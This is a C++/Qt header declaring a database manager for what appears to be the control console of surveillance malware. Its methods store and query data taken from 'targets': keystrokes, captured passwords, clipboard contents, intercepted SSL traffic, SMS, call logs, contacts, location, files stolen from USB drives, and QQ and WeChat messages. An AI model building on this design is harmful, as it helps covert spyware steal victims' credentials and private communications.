/*
	Description : 数据库操作类
	Author		: Ruining Song
	Date		: 2013.11.11
	Remark		:
*/

#ifndef DATABASEMANAGER_H
#define DATABASEMANAGER_H

#include <QtSql>
#include <QtGui>
#include "pagetablewidget.h"
#include "Target.h"
#include "Utility.h"

#include <string>
#include <list>

class DatabaseManager : public QObject
{
	
	Q_OBJECT

signals:
	void emitCalInfoFinished(bool);

	void emitLogDetailInfoFinished(unsigned int);
	void emitLogDownloadInfoFinished(unsigned int);
	void emitLogUploadInfoFinished(unsigned int);
	void emitLogPluginInfoFinished(unsigned int);

	void emitKeyboardInfoFinished(unsigned int);

	void emitAppRecordCount(int count);
	void emitAppCurrentRecordAdd();
	void emitAppExportFinished();
	void emitAppExportCanceled();

public:

	// 构造函数
	DatabaseManager(std::wstring connStr, std::wstring User = L"", std::wstring Password = L"");

	// 析构函数
	~DatabaseManager();

public slots:

	////////////////////////////////////////////

	// 查询目标列表
	void QueryTargetList();

	// 添加目标
	void AddTarget(Target *tar);

	// 更新目标信息
	void UpdateTargetInfo(Target *tar);

	// 更新目标信息
	void UpdateTargetExInfo(Target *tar);

	// 查询目标插件是否启用
	DWORD QueryTargetPluginStatus(DWORD targetId);

	// 修改目标插件启用状态
	void UpdatetargetPluginStatus(DWORD targetId, DWORD status);

	// 目标是否被收藏
	void UpdateTargetFavoriteStatus(DWORD targetId, bool status);

	// 查询目标上线是否自动获取目录信息 -1 - 不获取 0 - 获取全部 其他 - 获取层数
	int QueryTargetAutoGetStatus(DWORD targetId);

	// 目标上线是否自动获取目录信息 -1 - 不获取 0 - 获取全部 其他 - 获取层数
	void UpdateTargetAutoGetStatus(DWORD targetId, int depth);

	// 清除目标
	void ClearAndRemoveTarget(ULONG targetId);

	// 清除目标任务记录
	void ClearTargetHistoryTask(ULONG targetId);

	/////////////////////////////////////////////
	
	// 增加目标磁盘列表
	void AddTargetLogicDriver(ULONG  targetId, DriverSet &logDriver);

	// 查询目标磁盘列表
	int  QueryTargetLogicDriver(ULONG targetId, DriverSet &logDriver);

	//////////////////////////////////////////////

	// 查询目标插件列表
	void QueryTargetPluginList(ULONG targetId, PPLUGIN_CONTEXT PlgContext[MAX_PLG_COUNT]);

	// 查询目标是否存在指定插件
	bool TargetPluginIsExisted(ULONG targetId, ULONG  pluginId);

	// 更新目标插件信息
	void UpdateTargetPluginInfo(ULONG targetId, PPLUGIN_CONTEXT lpPlgContext);

	// 插入目标插件信息
	void InsertTargetPluginInfo(ULONG targetId, PPLUGIN_CONTEXT lpPlgContext);

	//////////////////////////////////////////////

	// 查询日志信息
	void QueryLogInfo(ULONG targetId, PageTableWidget* table);

	// Used by "QueryLogInfo"
	void AddFakeRow(
		bool online,
		QTableWidgetItem* time, 
		QTableWidgetItem* status,
		QTableWidgetItem* publicIp,
		QTableWidgetItem* localIp,
		QTableWidgetItem* macAddress,
		QTableWidgetItem* proc,
		QTableWidgetItem* user,
		PageTableWidget* table);

	// 查询细节日志信息
	void QueryLogDetailInfo(unsigned int targetId, PageTableWidget* table);

	// 查询下载日志信息
	void QueryLogDownloadInfo(unsigned int targetId, PageTableWidget* table);

	// 查询上传日志信息
	void QueryLogUploadInfo(unsigned int targetId, PageTableWidget* table);

	// 查询插件回传日志信息
	void QueryLogPluginInfo(unsigned int targetId, PageTableWidget* table);

	// 插入目标日志信息
	void InsertTargetLogInfo(ULONG targetId,
							const char  *status,
							const char  *lastTime,
							const char  *remLocalIpAddr,
							const char  *remPublicIpAddr,
							const char  *remMacAddr,
							const char  *lpOnlineProcBase64,
							const char  *lpLoginUserBase64);

	// 插入细节日志信息
	void InsertLogDetailInfo(ULONG targetId, std::wstring time, std::wstring content);

	// 将目标目录信息入库
	void AddOfflineDirInfo(Target		*tarBlock,
						   std::string		timeStr,
					       const char	*lpszdirPath,
						   const char	*lpszdirData);

	// 查询上次目标目录信息
	int QueryLastOfflineDirInfo(ULONG        targetId,
								const char   *lpszbase64Path,
								std::string      &dirTime,
								std::string      &dirData,
								int          *lpnId=NULL);

	// 添加异步搜索信息
	void AddAsyncSearchInfo(ULONG       targetId,
							std::string		searchDirPathBase64,
							DWORD       dwLevel,
							DWORD       dwMinSize,
							DWORD       dwMaxSize,
							FILETIME    ftBegTime,
							FILETIME    ftEndTime,
							std::string		aniNameFilterBase64,
							std::string		aniTypeFilterBase64,
							PCHAR       lpData);

	// 查询目录下载的历史记录
	void QueryDirDownDetail(ULONG targetId, ULONG parentId, QTableWidget* table);

	// 查询插件数据回传记录
	void QueryPluginData(ULONG targetId, QTableWidget* table);

	//////////////////////////////////////////////

	// 添加 usb 操作
	void AddUsbOperation(ULONG			targetId,
						 ULONG			usbId,
						 std::wstring	driver,
						 const char *	lpszInTime,
						 const char *	lpszOutTime);

	// 查询 usb 数量
	int QueryUSBOpCount(ULONG dwTargetId);

	// 查询 usb 数据
	int QueryUSBOpData(ULONG dwTargetId, QTableWidget* table);

	// 增加 usb 文件
	void AddUsbFile(ULONG		targetID,
					std::string		base64Path,
					char*		lpszThiefTIme,
					ULONG		dwFileSize,
					char		*lpszLwTIme);

	// 查找 usb 文件
	int  QueryUsbFile(ULONG targetID, QTableWidget* table);

	// 增加 usb 目录信息
	void AddUsbDirInfo(ULONG       targetId,
					   ULONG       usbId,
					   const char  *lpszInTime,
					   const char  *dirPath,
					   const char  *dirData);

	// 查找 usb 目录
	int  QueryUsbDir(ULONG		targetID,
					std::string	aniTime,
					std::string	base64Path,
					std::string	&dirData);

	// usb 目录是否存在
	bool UsbDirIsExisted(ULONG  targetId,
						std::string  aniTime,
						std::string  base64Path);


	/////////////////////////////////////////////

	//
	// 文件夹监控 （此接口已舍弃）
	//

	// 插入监控的文件夹
	void InsertTargetMonitorDir(
		unsigned int targetId, 
		unsigned int taskId, 
		std::wstring dirPath, 
		std::wstring monitorTime, 
		std::wstring remark,
		bool isDir);

	// 查询监控的文件夹
	void QueryTargetMonitorDir(unsigned int targetId, MonitorDirMap& dirMap);

	// 删除监控的文件夹
	void DeleteTargetMonitorDir(unsigned int taskId);

	// 插入监控的文件列表
	// info 是已经按文件名排序过的列表
	void InsertTargetMonitorFile(unsigned int targetId, unsigned int taskId, MonitorFileInfoList& info);

	// 查询监控的文件列表
	// 查询结果反映在 info 里
	void QueryTargetMonitorFile(unsigned int targetId, unsigned int taskId, MonitorFileInfoList& info);

	// 删除监控的文件列表
	void DeleteTargetMonitorFile(unsigned int taskId);

	// 插入文件变动记录
	void InsertTargetMonitorFileRecord(
		unsigned int taskId, 
		std::wstring fileName, 
		std::wstring fileChangeType, 
		std::wstring fileChangeTime, 
		std::wstring remark);

	// 查询文件变动记录
	void QueryTargetMonitorFileRecord(unsigned int taskId, QTreeWidgetItem* parent);

	// 删除文件变动记录
	void DeleteTargetMonitorFileRecord(unsigned int taskId);

	//////////////////////////////////////////////

	// 检查并插入文件任务
	void CheckAndInsertFileTask(FileTask *lpFileTask, const char *ctrPathBase64, const char *tarPathBase64);

	// 插入文件任务
	void InsertFileTask(FileTask *lpFileTask,  const char *ctrPathBase64, const char *tarPathBase64);

	// 插入文件信息任务
	void InsertDirInfoTask(DirTask *lpDirTask, const char *tarPathBase64);

	// 插入文件下载任务
	void InsertDirDownTask(DirTask *lpDirTask, const char *tarPathBase64);

	// 插入文件搜索任务
	void InsertSearchTask(SearchTask *lpSearchTask,
						  const char *tarPathBase64,
						  const char *nameBase64,
						  const char *typeBase64);

	// 检查目录任务
	bool  CheckDirTask(DWORD dwTargetId, std::wstring wDirPath, PFILE_BLOCK lpFileBlock);

	// 检查文件任务
	DWORD CheckFileTask(DWORD dwTargetId, std::wstring wFilePath, PFILE_BLOCK lpFileBlock);
/*
	// 查找文件上传任务
	DWORD QueryFileUpTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);

	// 查找文件下载任务
	DWORD QueryFileDownTask(int             nPageDirect,
							DWORD           dwTargetId,
							TTntListView    *tntlv,
							PDWORD          lpdwLeftId,
							PDWORD          lpdwRightId);

	// 查找目录下载任务
	DWORD QueryDirDownTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// 查找目录详细信息下载任务
	DWORD QueryDirDownDetailTask(DWORD           dwTargetId,
								 DWORD           dwDirTaskId,
								 TTntListView    *tntlv);

	// 查询目录信息任务
	DWORD QueryDirInfoTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// 查询搜索任务
	DWORD QuerySearchTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);

	// 查询插件信息任务
	DWORD QueryPlgDataTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// 查询插件更新任务
	DWORD QueryPlgUptTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);
*/
	//////////////////////////////////////////////

	// 插入进程执行信息
	void InsertPEIInfo(ULONG		targetId,
					   long			execTime,
					   std::wstring		procName,
					   ULONG		procId,
					   std::wstring		cmdLine);

	// 插入键盘记录信息
	void InsertIMEInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        processId,
					   std::wstring      captionName,                                  
					   std::wstring      content);

	// 插入密码记录信息
	void InsertPWIInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        procId,
					   std::wstring      caption,
					   std::wstring      content);

	// 插入剪贴板记录
	void InsertCBDInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        procId,
					   std::wstring      content);

	// 插入文件操作记录
	void InsertFOIInfo(ULONG        targetId,
					   long         opTime,
					   std::wstring		procName,
					   ULONG        procId,
					   FileOpType   opType,
					   std::wstring		srcFileName,
					   std::wstring		dstFileName);

	// 插入 SSL 信息
	int InsertSSLInfo(ULONG         targetId,
					  const char    *lpsztime,
					  DWORD         hKey,
					  std::wstring		procName,
					  DWORD         procId,
					  DWORD         threadId,
					  DWORD         packageType,
					  int           encryptFlag,
					  DWORD         passFlag,
					  DWORD         finalFlag,
					  const char   *host,                                  
					  const char   *data,
					  ULONG         dataLen);

	// 插入 SMS 信息
	int InsertSMSInfo(ULONG			targetId,
					  std::wstring	date,
					  LONG			type,
					  std::wstring	address,
					  std::wstring	message);

	// 清空 SMS 信息
	void ClearSMSInfo(ULONG targetID);

	// 插入 CAL 信息
	int InsertCALInfo(ULONG			targetId,
					  std::wstring	date,
					  LONG			type,
					  std::wstring	address,
					  LONG			duration);

	// 清空 CAL 信息
	void ClearCALInfo(ULONG targetID);

	// 插入 CONTACT 信息
	void InsertCONTACTInfo(ULONG targetID, std::wstring name, std::wstring phone, std::wstring remark);

	// 清空 CONTACT 信息
	void ClearCONTACTnfo(ULONG targetID);

	// 插入 location 信息
	void InsertLocationInfo(ULONG targetID, std::wstring time, std::wstring locationX, std::wstring locationY, std::wstring remark);


	// 查询 SSL 信息
	void  QuerySSLInfo(ULONG targetId, QTreeWidget* tree);

	// 查询 SSL 数据
	//TMemoryStream* QuerySSLData(int httpsId);

	//////////////////////////////////////////////

	// 查询文件操作记录内容
	int QueryUserFOIData(ULONG          dwTargetId,
						 PCHAR          opType,
						 QTableWidget*	table);


	// 查询键盘记录内容
	int QueryIMEData(unsigned int dwTargetId, PageTableWidget* table);


	// 查询密码记录内容
	int QueryPWIData(ULONG dwTargetId, QTableWidget* table);

	// 查询剪贴板记录内容
	int QueryCBDData(ULONG dwTargetId, QTableWidget* table);

	// 查询进程执行记录内容
	int QueryPEIData(ULONG dwTargetId, QTableWidget* table);

	// 查询文件操作记录内容
	int QueryFOIData(ULONG dwTargetId, QTableWidget* table);

	// 查询短信记录
	int QuerySMSData(ULONG dwTargetId, QTableWidget* table);

	// 查询通话记录
	int QueryCALData(unsigned int dwTargetId, QTableWidget* table);

	// 查询通讯录
	int QueryCONTACTData(unsigned int dwTargetId, QTableWidget* table);

	// 查询 location 信息
	void QueryLocationInfo(ULONG targetID, QTableWidget* table);

	////////////////////////////////////////////////

	// 插入文件监控记录
	void InsertFileMonitorRecord(ULONG dwTargetId,
								 std::wstring recordName, 
								 std::wstring recordPath, 
								 std::wstring recordTime);

	// 清除文件监控记录
	void CleanFileMonitorRecord(ULONG dwTargetId, std::wstring recordPath);

	// 插入文件监控列表
	void InsertFileMonitorList(ULONG dwTargetId, 
							   std::wstring fileName, 
							   std::wstring filePath, 
							   std::wstring fileTime, 
							   std::wstring fileType, 
							   ULONG isDir);

	// 取消监控文件
	void RemoveFileMonitorList(ULONG dwTargetId, std::wstring path);

	bool QueryFileItemMonitored(ULONG targetId, std::wstring filePath);

	// 查询文件监控记录
	void QueryFileMonitorRecord(ULONG dwTargetId, QTreeWidget* tree);

	// 查询文件监控列表
	void QueryFileMonitorList(ULONG dwTargetId, QTreeWidget* tree);

	// 查询文件监控记录数量
	int GetFileRecordCount(ULONG dwTargetId, std::wstring path);

	// QQ相关

	bool QQAccountExist(ULONG dwTargetId, std::wstring qqNumber);

	void InsertQQAccount(ULONG dwTargetId, std::wstring qqNumber);

	bool QQFriendExist(ULONG dwTargetId, std::wstring owner, std::wstring number);

	void InsertQQFriend(
		ULONG dwTargetId, 
		std::wstring owner, 
		std::wstring number, 
		std::wstring nickName, 
		std::wstring remark, 
		std::wstring signature,
		std::wstring group);

	bool QQTroopExist(ULONG targetId, std::wstring owner, std::wstring number);

	void InsertQQTroop(
		ULONG targetId,
		std::wstring owner,
		std::wstring number,
		std::wstring troopName,
		std::wstring troopMemo);

	// 如果消息为图片或语音，则 content 存储路径
	void InsertQQMessage(
		ULONG dwTargetId,
		std::wstring owner,
		int type,
		std::wstring containerNumber,
		std::wstring senderNumber,
		std::wstring senderNickName,
		std::wstring time,
		int msgType,
		std::wstring content);


	// 微信相关

	bool WeixinAccountExist(ULONG dwTargetId, std::wstring weixinId);

	void InsertWeixinAccount(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring nickName);

	bool WeixinFriendExist(ULONG dwTargetId, std::wstring weixinId, std::wstring friendId);

	void InsertWeixinFrineds(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring friendId,
		std::wstring nickName);

	void InsertWeixinMessage(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring friendId,
		std::wstring senderId,
		std::wstring time,
		int type,
		std::wstring content
		);

	void CleanAppData(ULONG targetId);

	// 导出聊天记录相关
	void StartExportAppRecord(QString path, int targetId);
	void CancelExportAppRecord();

	////////////////////////////////////////////////////////////////////

	// 查询归属地及运营商
	void GetLocationFromPhoneNumber(
		const std::wstring& phoneNumber, 
		std::wstring& location,
		std::wstring& netService);

	// 清空数据库
	void CleanDatabase();

	// 清除目标数据
	void CleanTargetData(ULONG targetId);

	// 测试用
	void UnitTest();

	// 加锁
	inline void Lock() { EnterCriticalSection(&csGui); }

	// 解锁
	inline void Unlock() { LeaveCriticalSection(&csGui); }

private:    

	//
	// 关键区域
	//
	CRITICAL_SECTION  csGui;                        // 界面主线程专用(只有一个)
	CRITICAL_SECTION  csControlConn;                // ConnThread专用(只有一个)
	CRITICAL_SECTION  csTarConn;                    // 目标线程专用（有多个线程）
	CRITICAL_SECTION  csPlgData;                    // 处理插件数据

	QSqlDatabase db;

	// 取消导出聊天记录 flag
	HANDLE m_hExport;
};

extern DatabaseManager* DM;

#endif // DATABASEMANAGER_H